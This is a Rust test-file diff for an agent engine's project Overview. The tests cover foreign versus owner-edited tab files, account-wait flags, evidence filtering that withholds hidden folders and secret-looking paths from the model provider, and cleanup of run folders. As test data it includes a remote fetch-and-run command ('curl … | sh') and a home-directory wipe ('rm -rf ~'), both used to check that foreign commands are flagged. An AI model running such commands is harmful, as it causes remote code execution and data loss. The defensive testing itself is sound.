@@ -7,6 +7,9 @@ const FEATURES: &str = ".crazyagent/overview/features.md";
 
 fn case() -> (Connection, ProjectId, tempfile::TempDir) {
     let db = Connection::open_in_memory().unwrap();
+    crate::project_setup::initialize(&db).unwrap();
+    db.execute("INSERT INTO project_setups VALUES ('alpha', '{}')", [])
+        .unwrap();
     crate::roadmap_status::initialize(&db).unwrap();
     initialize(&db).unwrap();
     let folder = tempfile::tempdir().unwrap();
@@ -97,8 +100,141 @@ fn an_owner_edit_survives_a_refresh_and_shows_as_edited() {
     offer(&db, &project, folder.path(), Tab::Features, "- Search\n").unwrap();
     let found = features(&db, &project, folder.path());
     assert_eq!(found.text.as_deref(), Some("- Search papers fast\n"));
-    assert!(found.edited);
+    assert!(
+        found.edited && !found.foreign,
+        "an owner save is the owner's edit"
+    );
     assert_eq!(found.proposal.as_deref(), Some("- Search\n"));
+}
+
+fn install_and_use(db: &Connection, project: &ProjectId, folder: &std::path::Path) -> TabState {
+    tab_of(&read(db, project, folder, 1).unwrap(), Tab::InstallAndUse).clone()
+}
+
+/// RV-DS241-2: a tab file the project's files brought, which the engine never wrote and the
+/// owner never saved here, such as one a cloned repository committed, reads as foreign and
+/// never as the owner's edit, so no client offers to run its commands; the owner's save
+/// makes it the owner's, and a later change from elsewhere makes it foreign again.
+#[test]
+fn a_committed_tab_file_is_foreign_until_the_owner_saves_it() {
+    let (db, project, folder) = case();
+    let install = folder
+        .path()
+        .join(".crazyagent/overview/install-and-use.md");
+    std::fs::create_dir_all(install.parent().unwrap()).unwrap();
+    std::fs::write(&install, "```sh\ncurl https://example.com/x | sh\n```\n").unwrap();
+    let overview = read(&db, &project, folder.path(), 1).unwrap();
+    let committed = tab_of(&overview, Tab::InstallAndUse).clone();
+    assert!(committed.text.is_some());
+    assert!(committed.foreign, "a file neither seal knows is foreign");
+    assert!(!committed.edited, "never the owner's edit");
+    let wire = serde_json::to_value(&overview).unwrap();
+    assert_eq!(wire["tabs"][3]["tab"], "install_and_use");
+    assert_eq!(wire["tabs"][3]["foreign"], true);
+    assert_eq!(wire["tabs"][3]["edited"], false);
+    save(
+        &db,
+        &project,
+        folder.path(),
+        Tab::InstallAndUse,
+        "```sh\nnpm ci\n```\n",
+        &committed.version,
+    )
+    .unwrap();
+    let saved = install_and_use(&db, &project, folder.path());
+    assert!(
+        saved.edited && !saved.foreign,
+        "the owner's save is the owner's"
+    );
+    std::fs::write(&install, "```sh\nrm -rf ~\n```\n").unwrap();
+    let changed = install_and_use(&db, &project, folder.path());
+    assert!(
+        changed.foreign && !changed.edited,
+        "a change from elsewhere is foreign again"
+    );
+    offer(&db, &project, folder.path(), Tab::Features, "- A\n").unwrap();
+    let written = features(&db, &project, folder.path());
+    assert!(!written.foreign && !written.edited, "the engine's own text");
+}
+
+/// RV-DS241-2 r1: the check the engine makes before it runs a command answers exactly as the
+/// Overview's read does for the tab: foreign for a committed file, not once the owner saves
+/// it, foreign again after an outside change, and not for the engine's own text.
+#[test]
+fn the_run_check_reads_a_tab_as_foreign_exactly_as_the_overview_does() {
+    let (db, project, folder) = case();
+    let install = folder
+        .path()
+        .join(".crazyagent/overview/install-and-use.md");
+    let foreign = |db: &Connection| {
+        let answer = tab_foreign(db, &project, folder.path(), Tab::InstallAndUse).unwrap();
+        assert_eq!(answer, install_and_use(db, &project, folder.path()).foreign);
+        answer
+    };
+    assert!(!foreign(&db), "no file is nothing to run");
+    std::fs::create_dir_all(install.parent().unwrap()).unwrap();
+    std::fs::write(&install, "```sh\ncargo install alpha\n```\n").unwrap();
+    assert!(foreign(&db), "a committed file is foreign");
+    let committed = install_and_use(&db, &project, folder.path());
+    let text = committed.text.unwrap();
+    save(
+        &db,
+        &project,
+        folder.path(),
+        Tab::InstallAndUse,
+        &text,
+        &committed.version,
+    )
+    .unwrap();
+    assert!(!foreign(&db), "the owner's save");
+    std::fs::write(&install, "```sh\ncargo install beta\n```\n").unwrap();
+    assert!(foreign(&db), "an outside change after the save");
+    std::fs::remove_file(&install).unwrap();
+    offer(
+        &db,
+        &project,
+        folder.path(),
+        Tab::InstallAndUse,
+        "```sh\nmake\n```\n",
+    )
+    .unwrap();
+    assert!(
+        install_and_use(&db, &project, folder.path()).text.is_some(),
+        "the engine wrote the tab"
+    );
+    assert!(!foreign(&db), "the engine's own text");
+}
+
+/// A tabs table made before the owner's seal was kept gets that column when the engine
+/// starts, more than once without harm, and an owner's save in it reads as the owner's
+/// edit, never as a foreign file.
+#[test]
+fn an_older_tabs_table_gets_the_owner_seal_and_an_owner_save_reads_as_the_owners() {
+    let db = Connection::open_in_memory().unwrap();
+    crate::roadmap_status::initialize(&db).unwrap();
+    db.execute_batch(
+        "CREATE TABLE project_overview_tabs(project TEXT NOT NULL, tab TEXT NOT NULL,
+           seal TEXT, proposal TEXT, PRIMARY KEY(project, tab));",
+    )
+    .unwrap();
+    initialize(&db).unwrap();
+    initialize(&db).unwrap();
+    let folder = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(folder.path().join(".crazyagent")).unwrap();
+    let project = ProjectId::new("alpha").unwrap();
+    offer(&db, &project, folder.path(), Tab::Features, "- A\n").unwrap();
+    let version = features(&db, &project, folder.path()).version;
+    save(
+        &db,
+        &project,
+        folder.path(),
+        Tab::Features,
+        "- mine\n",
+        &version,
+    )
+    .unwrap();
+    let saved = features(&db, &project, folder.path());
+    assert!(saved.edited && !saved.foreign);
 }
 
 #[test]
@@ -326,6 +462,32 @@ fn a_landed_set_marks_the_overview_stale_only_when_refresh_follows_landing() {
     assert_eq!(due, 2_000 + crate::roadmap_status::QUIET_MS);
 }
 
+/// A landing that ends after its project was removed makes no Overview row, so no run of a
+/// removed project is listed due and retried every minute, and an id added again inherits
+/// no row; a project still set up is marked as before (RV-DS241-81 r1 F1, code track).
+#[test]
+fn a_landing_after_its_project_was_removed_makes_no_overview_row() {
+    let (db, project, _folder) = case();
+    let rows = |db: &Connection| -> i64 {
+        db.query_row("SELECT COUNT(*) FROM project_overview", [], |row| {
+            row.get(0)
+        })
+        .unwrap()
+    };
+    db.execute(
+        "DELETE FROM project_setups WHERE project=?1",
+        [project.as_str()],
+    )
+    .unwrap();
+    mark_landed(&db, &project);
+    assert_eq!(rows(&db), 0, "a removed project got an Overview row");
+    db.execute("INSERT INTO project_setups VALUES ('alpha', '{}')", [])
+        .unwrap();
+    mark_landed(&db, &project);
+    assert_eq!(rows(&db), 1);
+    assert!(state(&db, &project).unwrap().stale);
+}
+
 #[test]
 fn the_first_read_asks_for_the_first_writing_run_and_lists_the_four_tabs_in_order() {
     let (db, project, folder) = case();
@@ -416,6 +578,7 @@ fn an_overview_goes_over_the_wire_in_the_shape_the_desktop_reads() {
     assert_eq!(wire["refresh"], "after_landing");
     assert_eq!(wire["apply"], "always_ask");
     assert_eq!(wire["needs_home"], false);
+    assert_eq!(wire["waiting_for_account"], false);
     assert_eq!(wire["tabs"][3]["blocked"], serde_json::Value::Null);
     std::fs::write(folder.path().join(".crazyagent/overview/features.md"), "\n").unwrap();
     let blank = serde_json::to_value(read(&db, &project, folder.path(), 1).unwrap()).unwrap();
@@ -506,7 +669,7 @@ fn an_owner_save_that_meets_a_refresh_in_the_middle_of_its_write_is_refused_not_
     .unwrap();
     let kept = features(&owner, &project, folder.path());
     assert_eq!(kept.text.as_deref(), Some("- mine\n"));
-    assert!(kept.edited);
+    assert!(kept.edited && !kept.foreign);
 }
 
 #[test]
@@ -529,7 +692,10 @@ fn a_file_that_appears_while_the_first_text_of_a_tab_is_written_is_kept() {
         .collect();
     assert_eq!(names, ["features.md"]);
     let found = features(&db, &project, folder.path());
-    assert!(found.edited);
+    assert!(
+        found.foreign && !found.edited,
+        "a file another writer put there is not the owner's edit"
+    );
     assert!(found.proposal.is_none());
 }
 
@@ -633,6 +799,7 @@ fn evidence_holds_the_readme_a_manifest_the_tree_and_research_within_its_bound()
     }];
     let pack = evidence(
         folder.path(),
+        &[],
         &research,
         &["src/main.rs".to_owned(), "src/search.rs".to_owned()],
     );
@@ -669,7 +836,7 @@ fn evidence_keeps_its_bounds_when_the_tree_and_the_research_are_larger_than_the_
             text: "^".repeat(20_000),
         },
     ];
-    let pack = evidence(folder.path(), &research, &tree);
+    let pack = evidence(folder.path(), &[], &research, &tree);
     assert!(pack.len() <= EVIDENCE_BYTES_MAX);
     assert!(pack.contains("# Alpha"));
     assert!(pack.contains("src/kept.rs"));
@@ -1001,7 +1168,7 @@ fn no_backtick_run_in_research_closes_its_fence_in_the_evidence() {
             path: "docs/research.md".into(),
             text: format!("Before.\n{}\nAfter.\n", "`".repeat(run)),
         }];
-        let pack = evidence(folder.path(), &research, &[]);
+        let pack = evidence(folder.path(), &[], &research, &[]);
         assert!(pack.len() <= EVIDENCE_BYTES_MAX);
         let part = &pack[pack.find("# Competitor research").unwrap()..];
         assert!(part.contains("Before."), "run of {run}");
@@ -1297,6 +1464,72 @@ fn a_run_without_competitor_research_never_asks_for_or_writes_the_competitors_ta
     assert!(asked.contains("~~~competitors"));
     assert!(asked.contains("Current competitors:"));
     assert!(asked.contains("Beta is faster at search."));
+}
+
+/// RV-DS241-78 and -79: what a writing run sends the model provider keeps the onboarding
+/// mapping's skip rules: no document, file path or research file in a folder the owner hid
+/// from the project's agents, and no file path that looks like it holds a secret, while
+/// the rest of the evidence stays.
+#[cfg(unix)]
+#[test]
+fn a_writing_run_is_shown_nothing_in_a_hidden_folder_and_no_secret_looking_path() {
+    let (db, project, folder) = case();
+    let notes = folder.path().join("notes");
+    std::fs::create_dir(&notes).unwrap();
+    std::fs::write(
+        notes.join("acquisition-plan.md"),
+        "# Plan\n\nBuy Beta quietly.\n",
+    )
+    .unwrap();
+    std::fs::write(
+        folder.path().join("guide.md"),
+        "# Guide\n\nSearch papers fast.\n",
+    )
+    .unwrap();
+    let hidden =
+        crate::sandbox::hidden_paths::checked(notes.to_str().unwrap(), folder.path()).unwrap();
+    crate::sandbox::hidden_paths::save(&db, project.as_str(), &[hidden]).unwrap();
+    let research = [
+        Research {
+            path: "notes/rivals.md".into(),
+            text: "Gamma pricing leak.\n".into(),
+        },
+        Research {
+            path: "docs/research-competitors.md".into(),
+            text: "Beta is faster at search.\n".into(),
+        },
+    ];
+    let tree = [
+        "src/main.rs",
+        ".env.production",
+        "deploy/id_rsa",
+        "k8s/kubeconfig",
+        "credentials",
+        "id_ed25519",
+        "notes/acquisition-plan.md",
+    ]
+    .map(str::to_owned);
+    let (asked, _) = brief(&db, &project, folder.path(), &research, &tree, 0).unwrap();
+    for kept in [
+        "Search papers fast.",
+        "Beta is faster at search.",
+        "src/main.rs",
+    ] {
+        assert!(asked.contains(kept), "{kept} is in the evidence");
+    }
+    for gone in [
+        "Buy Beta quietly.",
+        "acquisition-plan",
+        "Gamma pricing leak.",
+        "notes/rivals.md",
+        ".env.production",
+        "id_rsa",
+        "kubeconfig",
+        "credentials",
+        "id_ed25519",
+    ] {
+        assert!(!asked.contains(gone), "{gone} reached the provider");
+    }
 }
 
 #[test]
@@ -1694,6 +1927,50 @@ fn a_run_that_got_an_account_drops_the_no_account_line_and_keeps_any_other() {
     assert_eq!(overview.failure.as_deref(), Some(UNFINISHED));
 }
 
+/// Only the wait for an account is told as a wait (IW-L1, DEC-147 addendum): the reply says
+/// so while the stored line is the no-account line, also once a run is claimed and until
+/// the pick drops it, and never for an ended real failure, neither while a Refresh waits
+/// to run nor while that run writes.
+#[test]
+fn only_the_no_account_line_is_told_as_a_wait_and_an_ended_failure_never_is() {
+    let (db, project, folder) = case();
+    let mut runs = FakeTabRuns::default();
+    assert!(
+        !read(&db, &project, folder.path(), 0)
+            .unwrap()
+            .waiting_for_account
+    );
+    assert_eq!(tick(&db, &mut runs, 0).unwrap(), 1);
+    let (_, waiting) = runs.claims.pop().unwrap();
+    assert!(wait_for_account(&db, &project, waiting, NO_ACCOUNT, 5).unwrap());
+    let overview = read(&db, &project, folder.path(), 6).unwrap();
+    assert!(overview.waiting_for_account && overview.stale && !overview.running);
+
+    assert_eq!(tick(&db, &mut runs, 6).unwrap(), 1);
+    let found = runs.claims.last().unwrap().1;
+    let overview = read(&db, &project, folder.path(), 7).unwrap();
+    assert!(overview.running && overview.waiting_for_account);
+    assert!(account_found(&db, &project, found).unwrap());
+    let overview = read(&db, &project, folder.path(), 7).unwrap();
+    assert!(overview.running && !overview.waiting_for_account);
+    assert_eq!(
+        runs.end(&db, folder.path(), Ended::Failed(UNFINISHED), 8),
+        1
+    );
+    let ended = read(&db, &project, folder.path(), 9).unwrap();
+    assert_eq!(ended.failure.as_deref(), Some(UNFINISHED));
+    assert!(!ended.waiting_for_account && !ended.stale && !ended.running);
+
+    refresh(&db, &project).unwrap();
+    let queued = read(&db, &project, folder.path(), 10).unwrap();
+    assert_eq!(queued.failure.as_deref(), Some(UNFINISHED));
+    assert!(queued.stale && !queued.running && !queued.waiting_for_account);
+    assert_eq!(tick(&db, &mut runs, 10).unwrap(), 1);
+    let writing = read(&db, &project, folder.path(), 11).unwrap();
+    assert_eq!(writing.failure.as_deref(), Some(UNFINISHED));
+    assert!(writing.running && !writing.waiting_for_account);
+}
+
 #[test]
 fn the_prompt_asks_for_every_tab_and_never_lets_the_agent_leave_one_out() {
     for with_competitors in [false, true] {
@@ -1747,4 +2024,217 @@ fn a_project_outside_the_projects_home_never_shows_a_run_failure_or_a_due_run() 
     assert!(overview.needs_home);
     assert!(overview.failure.is_none());
     assert!(!overview.stale && !overview.running);
+    assert!(!overview.waiting_for_account);
+}
+
+/// An Overview reply from an engine before IW-L1 has no `waiting_for_account` and still
+/// reads, as no wait for an account, so a newer client keeps its Overview during update
+/// skew (IW-L1 r1, DEC-147 addendum).
+#[test]
+fn an_overview_from_an_engine_without_the_wait_flag_reads_as_no_wait() {
+    let (db, project, folder) = case();
+    let mut overview = read(&db, &project, folder.path(), 0).unwrap();
+    overview.waiting_for_account = true;
+    let mut wire = serde_json::to_value(&overview).unwrap();
+    let fields = wire.as_object_mut().unwrap();
+    assert_eq!(fields.remove("waiting_for_account"), Some(true.into()));
+    let older: Overview = serde_json::from_value(wire).unwrap();
+    assert_eq!(
+        older,
+        Overview {
+            waiting_for_account: false,
+            ..overview
+        }
+    );
+}
+
+/// A writing run whose loopback provider refuses connections fails at once with the plain
+/// reach line, before its evidence is read or any agent folder is made, in place of a
+/// harness retrying the dead port until the run's time is over.
+#[cfg(target_os = "macos")]
+#[test]
+fn a_writing_run_whose_provider_refuses_connections_fails_at_once_with_the_reach_line() {
+    use crate::research::runner::{ResearchAccount, ResearchLimits, ResearchRunner};
+    use std::os::unix::fs::PermissionsExt;
+    let private = |path: &Path| {
+        std::fs::create_dir(path).unwrap();
+        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700)).unwrap();
+    };
+    let temp = tempfile::Builder::new()
+        .prefix("ca-reach-")
+        .tempdir_in(std::fs::canonicalize("/tmp").unwrap())
+        .unwrap();
+    std::fs::set_permissions(temp.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
+    let base = temp.path().canonicalize().unwrap();
+    let engine = base.join("engine");
+    private(&engine);
+    let database = engine.join("engine.db");
+    let sqlite = Connection::open(&database).unwrap();
+    sqlite.execute_batch("PRAGMA user_version=1").unwrap();
+    drop(sqlite);
+    std::fs::set_permissions(&database, std::fs::Permissions::from_mode(0o600)).unwrap();
+    let state = engine.join("research");
+    private(&state);
+    let root = base.join("repo");
+    std::fs::create_dir(&root).unwrap();
+    std::fs::create_dir(root.join(crate::projects_home::CRAZYAGENT_DIRECTORY)).unwrap();
+    let runner =
+        ResearchRunner::without_codex(&database, &state, ResearchLimits::default()).unwrap();
+    let (_held, port) = crate::spawn_gate::refusing_tcp_port().unwrap();
+    let account = ResearchAccount::Endpoint {
+        base_url: format!("http://127.0.0.1:{port}/v1"),
+        model: "local-model".into(),
+        key: None,
+    };
+    let line = format!(
+        "Can't reach the model provider at 127.0.0.1:{port}. Start it or pick another account in this pool, then try again."
+    );
+    let db = Connection::open_in_memory().unwrap();
+    let project = ProjectId::new("plant-shop").unwrap();
+    match agent::answer(&runner, &db, &project, &root, &account, &mut None) {
+        Err(agent::Unwritten::Failed(words)) => assert_eq!(words, line),
+        _ => panic!("the writing run did not fail with the reach line"),
+    }
+    assert!(
+        std::fs::read_dir(state.join("agents"))
+            .map_or(true, |mut entries| entries.next().is_none()),
+        "no agent folder was made"
+    );
+}
+
+/// RV-DS241-80: Delete everything records the project's Overview writing runs as engine
+/// files and removes each run's folder, which holds the evidence prompt and the session
+/// transcript, and its Seatbelt profile; the runs of a project whose id only starts the
+/// same or adds a `_`, a name in no run's shape and a research job's run all stay. Every run
+/// name is built as the engine builds it, with its run-id hash.
+#[test]
+fn delete_everything_removes_the_projects_overview_runs_and_no_other_projects() {
+    let root = tempfile::tempdir().unwrap();
+    let base = root.path().canonicalize().unwrap();
+    let agents = base.join("research").join("agents");
+    let profiles = base.join("research").join("profiles");
+    std::fs::create_dir_all(&profiles).unwrap();
+    let time = "1794000000000";
+    let named = |id: &str| run_name_at(&ProjectId::new(id).unwrap(), time);
+    let own = named("demo");
+    let others = [
+        named("demo-2"),
+        named("demonstration"),
+        named("demo_"),
+        "overview-demo-later".to_owned(),
+        "job-7-1".to_owned(),
+    ];
+    for name in others.iter().chain([&own]) {
+        std::fs::create_dir_all(agents.join(name).join("home")).unwrap();
+        std::fs::write(agents.join(name).join("prompt.md"), "evidence").unwrap();
+        std::fs::write(profiles.join(format!("{name}.sb")), "(version 1)").unwrap();
+    }
+    let plan = crate::projects_home::DeletePlan {
+        database: base.join("engine.db"),
+        project: ProjectId::new("demo").unwrap(),
+        home: base.join("home"),
+        folders: vec![],
+        agents: vec![],
+    };
+    let files = plan.engine_files(&[]);
+    let names: Vec<&str> = files.iter().map(|(name, _)| name.as_str()).collect();
+    assert_eq!(names, [own.as_str()]);
+    assert_eq!(
+        crate::projects_home::remove_engine_files(&plan.database, &files),
+        [own.clone()]
+    );
+    assert!(std::fs::symlink_metadata(agents.join(&own)).is_err());
+    assert!(std::fs::symlink_metadata(profiles.join(format!("{own}.sb"))).is_err());
+    for name in others {
+        assert!(agents.join(&name).join("prompt.md").is_file(), "{name}");
+        assert!(profiles.join(format!("{name}.sb")).is_file(), "{name}");
+    }
+}
+
+/// RV-DS241-80: what a finished Overview writing run left in the research state, its folder
+/// and its Seatbelt profile, is named for the research loop's later removal as a roadmap
+/// status run's is, and removed once the usage upkeep has counted the run.
+#[cfg(unix)]
+#[test]
+fn a_finished_overview_run_is_removed_like_a_status_run() {
+    use crate::roadmap_status::run::{RUN_KEPT, RunLeft};
+    let temp = tempfile::tempdir().unwrap();
+    let state = temp.path().canonicalize().unwrap();
+    let folder = state.join("agents").join("overview-demo-1794000000000");
+    std::fs::create_dir_all(folder.join("home")).unwrap();
+    std::fs::write(folder.join("prompt.md"), "evidence").unwrap();
+    std::fs::create_dir(state.join("profiles")).unwrap();
+    let profile = state
+        .join("profiles")
+        .join("overview-demo-1794000000000.sb");
+    std::fs::write(&profile, "(version 1)").unwrap();
+    let ended = std::time::Instant::now().checked_sub(RUN_KEPT).unwrap();
+    let left = RunLeft::at(folder.clone(), profile.clone(), ended);
+    assert!(left.due());
+    left.remove();
+    assert!(std::fs::symlink_metadata(&folder).is_err());
+    assert!(std::fs::symlink_metadata(&profile).is_err());
+}
+
+/// RV-DS241-80: a writing run's state name is read back as its own project's only, for a
+/// project id long enough to be cut too, ids that differ only in `.`, `:` or `_`, and ids
+/// that differ only past the cut, whatever the digits of its start time, so Delete
+/// everything takes no other project's run and every run of its own (r1 F1).
+#[cfg(unix)]
+#[test]
+fn the_name_of_an_overview_run_is_read_back_as_its_own_projects_only() {
+    let demo = ProjectId::new("demo").unwrap();
+    let name = run_name(&demo, 1_794_000_000_000);
+    let hash = crate::roadmap_status::run_stem(&demo)
+        .strip_prefix("roadmap-status-demo-")
+        .unwrap()
+        .to_owned();
+    assert_eq!(name, format!("overview-demo-{hash}-1794000000000"));
+    assert!(names_run(&demo, &name));
+    for other in ["demo-2", "dem", "demonstration"] {
+        let other = ProjectId::new(other).unwrap();
+        assert!(!names_run(&other, &name), "{other:?}");
+        assert!(
+            !names_run(&demo, &run_name(&other, 1_794_000_000_000)),
+            "{other:?}"
+        );
+    }
+    let long = ProjectId::new("l".repeat(128)).unwrap();
+    for time in [7, 1_794_000_000_000, i64::MAX] {
+        let name = run_name(&long, time);
+        assert!(name.len() <= 96 && names_run(&long, &name), "{name}");
+        assert!(!names_run(&demo, &name));
+    }
+    let past = |end: &str| ProjectId::new(format!("{}{end}", "a".repeat(100))).unwrap();
+    for (one, two) in [
+        ("web.app", "web_app"),
+        ("web:app", "web_app"),
+        ("web.app", "web:app"),
+        ("x.y", "x_2ey"),
+    ]
+    .map(|(one, two)| (ProjectId::new(one).unwrap(), ProjectId::new(two).unwrap()))
+    .into_iter()
+    .chain([(past("b"), past("c"))])
+    {
+        assert!(
+            !names_run(&one, &run_name(&two, 1_794_000_000_000)),
+            "{one:?} takes the runs of {two:?}"
+        );
+        assert!(
+            !names_run(&two, &run_name(&one, 1_794_000_000_000)),
+            "{two:?} takes the runs of {one:?}"
+        );
+    }
+    for odd in [
+        "overview-demo",
+        "overview-demo-",
+        "overview-demo-later",
+        "overview-demo-1-",
+        "overview-demo--1",
+        "overview-demo-12345678901234567890",
+        "roadmap-status-demo-1794000000000",
+        "job-1-1",
+    ] {
+        assert!(!names_run(&demo, odd), "{odd}");
+    }
 }
